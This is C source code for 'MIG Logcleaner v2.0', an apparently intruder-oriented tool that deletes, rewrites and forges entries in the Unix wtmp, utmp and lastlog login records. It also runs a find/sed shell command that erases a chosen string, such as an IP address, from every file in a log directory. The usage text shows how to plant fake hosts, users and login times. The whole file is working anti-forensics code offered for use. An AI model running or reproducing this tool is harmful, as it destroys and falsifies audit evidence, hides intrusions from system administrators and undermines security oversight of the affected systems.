// #include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/types.h>
#include <pwd.h>
#include <time.h>
#include <string.h>
#include <errno.h>
#include <paths.h>
#include <utmp.h>
// #include <utmpx.h>
// #include <lastlog.h>

#define UTMP "/var/run/utmp"
// #define UTMP UTMP_FILE
// #define WTMP WTMP_FILE
// #define LASTLOG _PATH_LASTLOG
#define WTMP "/var/log/wtmp"
#define LASTLOG "/var/log/lastlog"
#define bzero(n,s) memset(n,0,s)

int usage (char *arg);
int count_records (char *u, int a, int d);
int utmp_clean (char *u, int n, int tota, int d);
int utmpx_clean (char *u, int n, int tota, int d);
int lastlog_clean (char *u, int d, char *h, char *t, long i, int n);
int replase (char *u, int n, int tota1, int tota2, char *U, char *H, long I, long O, int d);
int addd (char *u, int n, int tota1, int tota2, char *U, char *T, char *H, long I, long O, int d);
int txt_clean (char *D, char *a, char *b, int d);

static char *lastlog_hostname = 0;
static char *lastlog_time = 0;
static char *lastlog_tty = 0;

int c = 1, l = 0;
  int debug = 0;
int main (int argc, char **argv)
{
  char opt;
  char user[16];
  char dir[256];
  char string1[256];
  char string2[256];
  char new_user[16];
  char new_tty[16];
  char new_host[256];
  char ll_h[256];
  char ll_i[256];
  char ll_t[256];
  long new_login = 0;
  long new_logout = 0;
  int replace = 0;
  int add = 0;
  int record = (-1);
  int total1 = 0;
  int total2 = 0;
  int user_check = 0;
  int dir_check = 0;
  int new_check = 0;
  int open_check1 = 0;
  int flag = 0;

  bzero (user, sizeof (user));
  bzero (dir, sizeof (dir));
  bzero (string1, sizeof (string1));
  bzero (string2, sizeof (string2));
  bzero (new_user, sizeof (new_user));
  bzero (new_tty, sizeof (new_tty));
  bzero (new_host, sizeof (new_host));
  bzero (ll_h, sizeof (ll_h));
  bzero (ll_i, sizeof (ll_i));
  bzero (ll_t, sizeof (ll_t));
  strcpy (dir, "/var/log/");
  while ((opt = getopt (argc, argv, "u:n:D:a:b:U:T:H:I:O:RAd")) != -1) {
    switch (opt) {
    case 'u':
      {
	strcpy (user, optarg);
	user_check++;
	break;
      }
    case 'n':
      {
	record = atoi (optarg);
	break;
      }
    case 'D':
      {
	bzero (dir, sizeof (dir));
	strcpy (dir, optarg);
	dir_check++;
	break;
      }
    case 'a':
      {
	strcpy (string1, optarg);
	flag++;
	break;
      }
    case 'b':
      {
	strcpy (string2, optarg);
	flag++;
	break;
      }
    case 'U':
      {
	strcpy (new_user, optarg);
	new_check++;
	break;
      }
    case 'T':
      {
	strcpy (new_tty, optarg);
	new_check++;
	break;
      }
    case 'H':
      {
	strcpy (new_host, optarg);
	new_check++;
	break;
      }
    case 'I':
      {
	new_login = atol (optarg);
	new_check++;
	break;
      }
    case 'O':
      {
	new_logout = atol (optarg);
	new_check++;
	break;
      }
    case 'R':
      {
	replace++;
	break;
      }
    case 'A':
      {
	add++;
	break;
      }
    case 'd':
      {
	debug++;
	break;
      }
    }
  }
  if ((user_check == 0 && add == 0 && dir_check == 0 && flag == 0)
      || (replace == 1 && add == 1) || (add == 1 && new_check != 5)
      || (replace == 1 && user_check == 0) || (replace == 1 && new_check == 0)
      || (replace == 1 && record == 0) || (dir_check == 1 && flag == 0)) {
    usage (argv[0]);
    exit (0);
  }
  printf ("\n[0;32m******************************[0m\n");
  printf ("[0;32m* MIG Logcleaner v2.0 by [0;31mno1 [0;32m*[0m\n");
  printf ("[0;32m******************************[0m\n\n");
  if (record == (-1)) {
    record = 1;
  }
  if (user[0] != 0)
    total1 = count_records (user, 1, debug);
  if (total1 == (-1)) {
    if (debug == 1)
      fprintf (stderr, "Error opening %s file to count records\n", WTMP);
    open_check1++;
  }
  if (open_check1 != 1 && replace == 0 && add == 0 && user_check != 0 && (record <= total1)) {
    utmp_clean (user, record, total1, debug);
  }
  if (replace == 1 && (record <= total1)) {
    if (l == 1) {
      strcpy (ll_h, lastlog_hostname);
      strcpy (ll_i, lastlog_time);
      strcpy (ll_t, lastlog_tty);
    }
    replase (user, record, total1, total2, new_user, new_host, new_login, new_logout, debug);
  }
  if (add == 1) {
    if (user[0] != 0 && (record > total1)) {
      usage (argv[0]);
      exit (0);
    }
    addd (user, record, total1, total2, new_user, new_tty, new_host, new_login, new_logout, debug);
  }
  if ((record == 1 || record == 0) && add == 0) {
    if (l == 1) {
      strcpy (ll_h, lastlog_hostname);
      strcpy (ll_i, lastlog_time);
      strcpy (ll_t, lastlog_tty);
    }
    lastlog_clean (user, debug, ll_h, ll_t, atol (ll_i), record);
  }
  if (flag != 0) {
    txt_clean (dir, string1, string2, debug);
  }
  printf ("\n");
  return (0);
}

int count_records (char *u, int a, int d)
{
  int fd;
  int counter = 0;

  if (a == 1) {
    struct utmp utmp_record;

    if ((fd = open (WTMP, O_RDWR)) == -1) {
      return (-1);
    }
    while (read (fd, (char *) &utmp_record, sizeof (utmp_record))) {
      if (!strcmp (utmp_record.ut_name, u)) {
	if (utmp_record.ut_type != 8)
	  counter++;
      }
    }
    fprintf (stdout, "[0x%d] %d users \"%s\" detected in %s\n", c++, counter, u, WTMP);
    close (fd);
  }
  return counter;
}

int utmp_clean (char *u, int n, int tota, int d)
{
  struct utmp utmp_record;
  struct utmp wtmp_record;
  int fd1, fd2;
  int counter = 0;
  int pid;
  char line[32];
  char host[256];
  char command[256];

  bzero (line, sizeof (line));
  bzero (host, sizeof (host));
  bzero (command, sizeof (command));
  if ((fd1 = open (WTMP, O_RDWR)) == -1) {
    if (d == 1)
      fprintf (stderr, "Error opening %s file\n", WTMP);
    exit (-1);
  }
  if ((fd2 = open ("/tmp/.WTMP.TMP", O_RDWR | O_CREAT)) == -1) {
    if (d == 1)
      fprintf (stderr, "Error opening /tmp/.WTMP.TMP file\n");
    exit (-1);
  }
  lseek (fd1, 0, SEEK_SET);
  lseek (fd2, 0, SEEK_SET);
  while (read (fd1, (char *) &wtmp_record, sizeof (wtmp_record)) == sizeof (wtmp_record)) {
    if ((!strcmp (wtmp_record.ut_name, u)) && (wtmp_record.ut_type != 8)) {
      counter++;
      if (counter == (tota + 1 - n)) {
	if (n != 0)
	  fprintf (stdout, "[0x%d] Removed \"%s\" entry #%d from %s\n", c++, u, n, WTMP);
	pid = wtmp_record.ut_pid;
	strcpy (line, wtmp_record.ut_line);
	strcpy (host, wtmp_record.ut_host);
      }
      else {
	if (counter == (tota - n)) {
	  char length[16];

	  l++;
	  bzero (length, sizeof (length));
	  lastlog_tty = (char *) malloc (strlen (wtmp_record.ut_line) + 1);
	  strcpy (lastlog_tty, wtmp_record.ut_line);
	  lastlog_hostname = (char *) malloc (strlen (wtmp_record.ut_host) + 1);
	  strcpy (lastlog_hostname, wtmp_record.ut_host);
	  sprintf (length, "%ld", wtmp_record.ut_time);
	  lastlog_time = (char *) malloc (strlen (length) + 1);
	  sprintf (lastlog_time, "%ld", wtmp_record.ut_tv.tv_sec);
	  sprintf (lastlog_time, "%ld", wtmp_record.ut_time);

	}
	if (n != 0) {
	  write (fd2, (char *) &wtmp_record, sizeof (wtmp_record));
	}
      }
    }
    else {
      write (fd2, (char *) &wtmp_record, sizeof (wtmp_record));
    }
  }
  close (fd1);
  close (fd2);
  if (n == 0 && counter != 0)
    fprintf (stdout, "[0x%d] Removed %d entries of user \"%s\" from %s\n", c++, counter, u, WTMP);
  counter = 0;
  if ((fd1 = open (UTMP, O_RDWR)) == -1) {
    if (d == 1)
      fprintf (stderr, "Error opening %s file\n", UTMP);
    exit (-1);
  }
  if ((fd2 = open ("/tmp/.UTMP.TMP", O_RDWR | O_CREAT)) == -1) {
    if (d == 1)
      fprintf (stderr, "Error opening /tmp/.UTMP.TMP file\n");
  }
  lseek (fd1, 0, SEEK_SET);
  lseek (fd2, 0, SEEK_SET);
  while (read (fd1, (char *) &utmp_record, sizeof (utmp_record)) == sizeof (utmp_record)) {
    if (!strcmp (utmp_record.ut_name, u)) {
      counter++;
      if ((pid == utmp_record.ut_pid)
	  && (!strcmp (utmp_record.ut_line, line))
	  && (!strcmp (utmp_record.ut_host, host))) {
	if (n != 0)
	  fprintf (stdout, "[0x%d] Removed \"%s\" coresponding entry from %s\n", c++, u, UTMP);
      }
      else {
	if (n != 0) {
	  write (fd2, (char *) &utmp_record, sizeof (utmp_record));
	}
      }
    }
    else {
      write (fd2, (char *) &utmp_record, sizeof (utmp_record));
    }
  }
  close (fd1);
  close (fd2);
  if (n == 0 && counter != 0)
    fprintf (stdout, "[0x%d] Removed %d entries of user \"%s\" from %s\n", c++, counter, u, UTMP);
  sprintf (command, "cat /tmp/.WTMP.TMP > %s;cat /tmp/.UTMP.TMP > %s;rm -f /tmp/.WTMP.TMP /tmp/.UTMP.TMP;", WTMP, UTMP);
  fprintf (stdout, "[0x%d] %s\n", c++, command);
  system (command);
  return (0);
}

int lastlog_clean (char *u, int d, char *h, char *t, long i, int n)
{
  struct passwd *password;
  struct lastlog last;
  int fd;

  bzero ((char *) &last, sizeof (last));
  if ((password = getpwnam (u))) {
    if ((fd = open (LASTLOG, O_RDWR)) >= 0) {
      lseek (fd, (long) password->pw_uid * sizeof (struct lastlog), 0);
      // read(fd,(char *)&lastlog,sizeof(lastlog));
      if (l == 1 && n != 0) {
	memcpy (last.ll_host, h, sizeof (last.ll_host));
	memcpy (last.ll_line, t, sizeof (last.ll_line));
	last.ll_time = i;
      }
      fprintf (stdout, "[0x%d] Changing \"%s\" coresponding entry in %s\n", c++, u, LASTLOG);
      // lseek(fd,-(sizeof(struct lastlog)),SEEK_CUR);
      write (fd, (char *) &last, sizeof (last));
      close (fd);
    }
  }
  return (0);
}

int replase (char *u, int n, int tota1, int tota2, char *U, char *H, long I, long O, int d)
{
  struct utmp utmp_record;
  struct utmp wtmp_record;
  struct timeval tv_start;
  struct timeval tv_end;
  int pid;
  int fd1, fd2;
  int counter = 0;
  int replace_check = 0;
  char line[32];
  char host[256];
  char command[256];

  tv_start.tv_sec = I;
  tv_start.tv_usec = 0;
  tv_end.tv_sec = O;
  tv_end.tv_usec = 0;
  bzero (line, sizeof (line));
  bzero (host, sizeof (host));
  bzero (command, sizeof (command));
  if (tota1 != (-1)) {
    if ((fd1 = open (WTMP, O_RDWR)) == -1) {
      if (d == 1)
	fprintf (stderr, "Error opening %s file\n", WTMP);
      exit (-1);
    }
    if ((fd2 = open ("/tmp/.WTMP.TMP", O_RDWR | O_CREAT)) == -1) {
      if (d == 1)
	fprintf (stderr, "Error opening /tmp/.WTMP.TMP file\n");
      exit (-1);
    }
    lseek (fd1, 0, SEEK_SET);
    lseek (fd2, 0, SEEK_SET);
    while (read (fd1, (char *) &wtmp_record, sizeof (wtmp_record)) == sizeof (wtmp_record)) {
      if ((!strcmp (wtmp_record.ut_name, u))
	  && (wtmp_record.ut_type != 8)) {
	counter++;
	if (counter == (tota1 + 1 - n)) {
	  replace_check++;
	  fprintf (stdout, "[0x%d] Replaced \"%s\" entry #%d from %s\n", c++, u, n, WTMP);
	  pid = wtmp_record.ut_pid;
	  strcpy (line, wtmp_record.ut_line);
	  strcpy (host, wtmp_record.ut_host);
	  if (U[0] != 0) {
	    bzero (wtmp_record.ut_name, sizeof (wtmp_record.ut_name));
	    strcpy (wtmp_record.ut_name, U);
	  }
	  if (H[0] != 0) {
	    bzero (wtmp_record.ut_host, sizeof (wtmp_record.ut_host));
	    strcpy (wtmp_record.ut_host, H);
	  }
	  if (I != 0) {
	    wtmp_record.ut_tv.tv_sec = tv_start.tv_sec;
	  }
	  write (fd2, (char *) &wtmp_record, sizeof (wtmp_record));
	}
	else {
	  if (counter == (tota1 - n)) {
	    char length[16];

	    l++;
	    bzero (length, sizeof (length));
	    lastlog_tty = (char *) malloc (strlen (wtmp_record.ut_line) + 1);
	    strcpy (lastlog_tty, wtmp_record.ut_line);
	    lastlog_hostname = (char *) malloc (strlen (wtmp_record.ut_host) + 1);
	    strcpy (lastlog_hostname, wtmp_record.ut_host);
	    sprintf (length, "%ld", wtmp_record.ut_time);
	    lastlog_time = (char *) malloc (strlen (length) + 1);
	    sprintf (lastlog_time, "%ld", wtmp_record.ut_tv.tv_sec);
	  }
	  write (fd2, (char *) &wtmp_record, sizeof (wtmp_record));
	}
      }
      else {
	if ((replace_check == 1)
	    && (!strcmp (wtmp_record.ut_line, line))
	    && (wtmp_record.ut_type == 8)) {
	  replace_check--;
	  if (O != 0) {
	    wtmp_record.ut_tv.tv_sec = tv_end.tv_sec;
	  }
	}
	write (fd2, (char *) &wtmp_record, sizeof (wtmp_record));
      }
    }
    close (fd1);
    close (fd2);
    counter = 0;
    replace_check = 0;
    if ((fd1 = open (UTMP, O_RDWR)) == -1) {
      if (d == 1)
	fprintf (stderr, "Error opening %s file\n", UTMP);
      exit (-1);
    }
    if ((fd2 = open ("/tmp/.UTMP.TMP", O_RDWR | O_CREAT)) == -1) {
      if (d == 1)
	fprintf (stderr, "Error opening /tmp/.UTMP.TMP file\n");
    }
    lseek (fd1, 0, SEEK_SET);
    lseek (fd2, 0, SEEK_SET);
    while (read (fd1, (char *) &utmp_record, sizeof (utmp_record)) == sizeof (utmp_record)) {
      if (!strcmp (utmp_record.ut_name, u)) {
	counter++;
	if ((pid == utmp_record.ut_pid)
	    && (!strcmp (utmp_record.ut_line, line))
	    && (!strcmp (utmp_record.ut_host, host))) {
	  replace_check++;
	  fprintf (stdout, "[0x%d] Replaced \"%s\" coresponding entry from %s\n", c++, u, UTMP);
	  if (U[0] != 0) {
	    bzero (utmp_record.ut_name, sizeof (utmp_record.ut_name));
	    strcpy (utmp_record.ut_name, U);
	  }
	  if (H[0] != 0) {
	    bzero (utmp_record.ut_host, sizeof (utmp_record.ut_host));
	    strcpy (utmp_record.ut_host, H);
	  }
	  if (I != 0) {
	    utmp_record.ut_tv.tv_sec = tv_start.tv_sec;
	  }
	  write (fd2, (char *) &utmp_record, sizeof (utmp_record));
	}
	else {
	  write (fd2, (char *) &utmp_record, sizeof (utmp_record));
	}
      }
      else {
	if ((replace_check == 1)
	    && (!strcmp (utmp_record.ut_line, line))
	    && (utmp_record.ut_type == 8)) {
	  replace_check--;
	  if (O != 0) {
	    utmp_record.ut_tv.tv_sec = tv_end.tv_sec;
	  }
	}
	write (fd2, (char *) &utmp_record, sizeof (utmp_record));
      }
    }
    close (fd1);
    close (fd2);
    replace_check = 0;
    sprintf (command,
	     "cat /tmp/.WTMP.TMP > %s;cat /tmp/.UTMP.TMP > %s;rm -f /tmp/.WTMP.TMP /tmp/.UTMP.TMP;", WTMP, UTMP);
    system (command);
  }
  return (0);
}

int addd (char *u, int n, int tota1, int tota2, char *U, char *T, char *H, long I, long O, int d)
{
  struct utmp wtmp_record;
  struct utmp new_wtmp_in_record;
  struct utmp new_wtmp_out_record;
  int fd1;
  int fd2;
  int counter = 0;
  int check = 0;
  char command[256];

  bzero (command, sizeof (command));
  // Create new entries
  new_wtmp_in_record.ut_type = 7;
  new_wtmp_in_record.ut_pid = 0;
  new_wtmp_in_record.ut_exit.e_termination = 0;
  new_wtmp_in_record.ut_exit.e_exit = 0;
  new_wtmp_in_record.ut_session = 0;
  new_wtmp_in_record.ut_tv.tv_sec = I;
  new_wtmp_in_record.ut_tv.tv_usec = 0;
  strcpy (new_wtmp_in_record.ut_user, U);
  strcpy (new_wtmp_in_record.ut_line, T);
  strcpy (new_wtmp_in_record.ut_host, H);
  new_wtmp_out_record.ut_type = 8;
  new_wtmp_out_record.ut_pid = 0;
  new_wtmp_out_record.ut_exit.e_termination = 0;
  new_wtmp_out_record.ut_exit.e_exit = 0;
  new_wtmp_out_record.ut_session = 0;
  new_wtmp_out_record.ut_tv.tv_sec = O;
  new_wtmp_out_record.ut_tv.tv_usec = 0;
  strcpy (new_wtmp_out_record.ut_user, U);
  strcpy (new_wtmp_out_record.ut_line, T);
  strcpy (new_wtmp_out_record.ut_host, H);
  if ((fd1 = open (WTMP, O_RDWR)) != (-1)) {
    if ((fd2 = open ("/tmp/.WTMP.TMP", O_RDWR | O_CREAT)) == (-1)) {
      if (d == 1)
	fprintf (stderr, "Error opening /tmp/.WTMP.TMP file\n");
    }
    while (read (fd1, (char *) &wtmp_record, sizeof (wtmp_record)) == sizeof (wtmp_record)) {
      if ((!strcmp (wtmp_record.ut_name, u))
	  && (wtmp_record.ut_type != 8)) {
	counter++;
	if (counter == (tota1 + 1 - n)) {
	  write (fd2, (char *) &wtmp_record, sizeof (wtmp_record));
	  write (fd2, (char *) &new_wtmp_in_record, sizeof (new_wtmp_in_record));
	  write (fd2, (char *) &new_wtmp_out_record, sizeof (new_wtmp_out_record));
	  fprintf (stdout, "[0x%d] Added  user \"%s\" before %d entry of user \"%s\" in %s file\n", c++, U, n, u, WTMP);
	}
	else {
	  write (fd2, (char *) &wtmp_record, sizeof (wtmp_record));
	}
      }
      else {
	write (fd2, (char *) &wtmp_record, sizeof (wtmp_record));
      }
    }
    if (u[0] == 0 && check == 0) {
      write (fd2, (char *) &new_wtmp_in_record, sizeof (new_wtmp_in_record));
      write (fd2, (char *) &new_wtmp_out_record, sizeof (new_wtmp_out_record));
      fprintf (stdout, "[0x%d] Added  user \"%s\" entry on top of  %s file\n", c++, U, WTMP);
      check++;
    }
    close (fd1);
    close (fd2);
    sprintf (command, "cat /tmp/.WTMP.TMP > %s;rm -f /tmp/.WTMP.TMP;", WTMP);
    system (command);
  }
  else {
    if (d == 1)
      fprintf (stderr, "Error opening %s file\n", WTMP);
  }
  counter = 0;
  check = 0;
  return (0);
}

int txt_clean (char *D, char *a, char *b, int d)
{
  char command[999];

  bzero (command, sizeof (command));
/*  sprintf (command, "echo \"find %s -type f|grep -v \
wtmp|grep -v utmp|grep -v lastlog>/tmp/dirs.\
IP\">/tmp/mig.sh;echo \"if [ -s /tmp/dirs.IP ]\">\
>/tmp/mig.sh;echo then>>/tmp/mig.sh;echo \"set \\`cat \
/tmp/dirs.IP\\`\">>/tmp/mig.sh;echo \"for F1 in \\
\`echo \\$@\\`\">>/tmp/mig.sh;echo do>>/tmp/mig.sh;ech\
o \"cat \\\"\\$F1\\\"|grep -v \\\"%s\\\">/tm\
p/F1.tmp;cat /tmp/F1.tmp>\\\"\\$F1\\\"\">>/tmp/mi\
g.sh;echo done>>/tmp/mig.sh;echo fi>>/tmp/mig.sh;echo \
\"if [ -s /tmp/dirs.IP ]\">>/tmp/mig.sh;echo then\
>>/tmp/mig.sh;echo \"set \\`cat /tmp/dirs.IP\\`\"\
>>/tmp/mig.sh;echo \"for F2 in \\`echo \\$@\\`\">\
>/tmp/mig.sh;echo do>>/tmp/mig.sh;echo \"cat \\\"\\$F2\
\\\"|grep -v \\\"%s\\\">/tmp/F2.tmp;cat /tmp\
/F2.tmp>\\\"\\$F2\\\"\">>/tmp/mig.sh;echo done>>/tmp/m\
ig.sh;echo fi>>/tmp/mig.sh", D, a, b);
 */
  sprintf(command, "find %s -type f | grep -v wtmp | grep -v utmp|grep -v lastlog | xargs sed -i '/%s/d'",D,a);
  //sprintf(command, "find %s -type f | grep -v wtmp | grep -v utmp|grep -v lastlog | xargs sed -i 'N;s/\\n.*%s.*//g'",D,a);
  if (debug==1) printf("%s",command);
  system (command);
//  system ("chmod +x /tmp/mig.sh");
//  system ("/tmp/mig.sh");
  printf ("[0x%d] Removed \"%s\" from %s\n", c++, a, D);
//  remove ("/tmp/mig.sh");
//  remove ("/tmp/F1.tmp");
//  remove ("/tmp/F2.tmp");
//  remove ("/tmp/dirs.IP");
  return (0);
}

int usage (char *arg)
{
  printf ("\n[0;32m******************************[0m\n");
  printf ("[0;32m* MIG Logcleaner v2.0 by [0;31mno1 [0;32m*[0m\n");
  printf ("[0;32m******************************[0m\n");
  printf ("usage: %s [-u] [-n] [-d] [-a] [-b] [-R] [-A] [-U] [-T] [-H] [-I] [-O] [-d]\n\n", arg);
  printf (" [-u <user>]\t- username\n");
  printf (" [-n <n>]\t- username record number, 0 removes all records (default: 1)\n");
  printf (" [-d <dir>]\t- log directory (default: /var/log/)\n");
  printf (" [-a <string1>]\t- string to remove out of every file in a log dir (ip?)\n");
  printf (" [-R]\t\t- replace details of specified user entry\n");
  printf (" [-A]\t\t- add new entry before specified user entry (default: 1st entry in list)\n");
  printf (" [-U <user>]\t- new username used in -R of -A\n");
  printf (" [-T <tty>]\t- new tty used in -A\n");
  printf (" [-H <host>]\t- new hostname used in -R or -A\n");
  printf (" [-I <n>]\t- new log in time used in -R or -A (unit time format)\n");
  printf (" [-O <n>]\t- new log out time used in -R or -A (unit time format)\n");
  printf (" [-d]\t\t- debug mode\n\n");
  printf ("eg:    %s -u john -n 2 -d /secret/logs/ -a 1.2.3.4\n", arg);
  printf ("       %s -u john -n 6\n", arg);
  printf ("       %s -d /secret/logs/ -a 1.2.3.4\n", arg);
  printf ("       %s -u john -n 2 -R -H china.gov\n", arg);
  printf ("       %s -u john -n 5 -A -U jane -T tty1 -H arb.com -I 12345334 -O 12345397\n\n", arg);
  return (0);
}

/*******************/
// greyhats.za.net //
/*******************/
